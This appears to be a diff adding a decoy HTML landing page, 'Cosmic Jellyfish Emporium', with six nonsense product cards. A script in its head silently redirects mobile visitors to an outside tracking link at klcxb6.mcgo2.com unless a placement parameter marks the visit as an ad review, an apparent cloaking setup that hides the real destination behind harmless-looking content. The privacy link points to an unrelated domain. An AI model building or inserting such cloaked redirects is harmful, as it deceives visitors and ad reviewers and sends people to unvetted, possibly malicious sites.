@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Emporium</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: radial-gradient(circle, #ff00ff, #00ffff);
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .card {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.3s ease-in-out;
+        }
+        .card:hover {
+            transform: scale(1.05);
+        }
+        footer {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            text-align: center;
+        }
+        a {
+            color: #ffff00;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Jellyfish Emporium</h1>
+    </header>
+    <main>
+        <div class="card">
+            <h2>Bioluminescent Tentacles</h2>
+            <p>Glow in the dark and mesmerize your friends!</p>
+        </div>
+        <div class="card">
+            <h2>Jellyfish Jam</h2>
+            <p>Spread some ocean magic on your toast!</p>
+        </div>
+        <div class="card">
+            <h2>Floating Meditation Pods</h2>
+            <p>Experience weightlessness like a true jellyfish!</p>
+        </div>
+        <div class="card">
+            <h2>Stinging Noodles</h2>
+            <p>Spice up your dinner with a shocking twist!</p>
+        </div>
+        <div class="card">
+            <h2>Translucent Umbrellas</h2>
+            <p>Stay dry while channeling your inner cnidarian!</p>
+        </div>
+        <div class="card">
+            <h2>Pulsating Nightlights</h2>
+            <p>Soothe yourself to sleep with gentle ocean rhythms!</p>
+        </div>
+    </main>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
